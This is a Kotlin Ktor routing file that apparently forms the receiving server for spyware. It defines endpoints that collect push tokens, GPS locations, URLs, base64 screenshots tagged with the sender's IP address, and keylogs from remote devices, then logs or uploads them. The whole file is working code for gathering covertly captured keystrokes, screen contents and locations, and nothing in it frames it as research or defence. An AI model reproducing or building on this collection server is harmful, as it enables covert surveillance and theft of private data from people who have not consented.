package ehea.plugins

import ehea.models.KeyLog
import ehea.models.Location
import ehea.models.PushToken
import ehea.models.Screenshot
import ehea.printError
import ehea.printInfo
import ehea.services.fileupload.FileUploadService
import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.http.content.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*

fun Application.configureRouting() {

    val fileUploadService = FileUploadService()
    routing {
        try {
            post("/sendpushtoken") {
                val pushToken = call.receive<PushToken>()
                call.respond(HttpStatusCode.OK, "Confirmed!")
            }

            post("/sendlocation") {
                val location = call.receive<Location>()
                val prettyLocation = "${location.lat}, ${location.lon}"
                printInfo(prettyLocation)
                call.respond(HttpStatusCode.OK, "Confirmed!")
            }

            post("/sendurl") {
                val url = call.receive<Url>()
                call.respond(HttpStatusCode.OK, "Confirmed!")
            }

            post("/sendscreenshot") {
                val ipAddress = call.request.headers["ip-address"]
                val screenshot = call.receive<Screenshot>()
                val screenshotBase64 = screenshot.base64

                fileUploadService.uploadScreenshot(
                    ip = ipAddress.toString(),
                    base64 = screenshotBase64
                )

                call.respond(HttpStatusCode.OK, "Confirmed!")
            }

            post("/sendkeylog") {
                val keyLog = call.receive<KeyLog>()
                call.respond(HttpStatusCode.OK, "Confirmed!")
            }

            // Static plugin. Try to access `/static/index.html`
            static("/static") {
                resources("static")
            }
        }
        catch (e: Exception) {
            printError(e.message.toString())
        }
    }

}
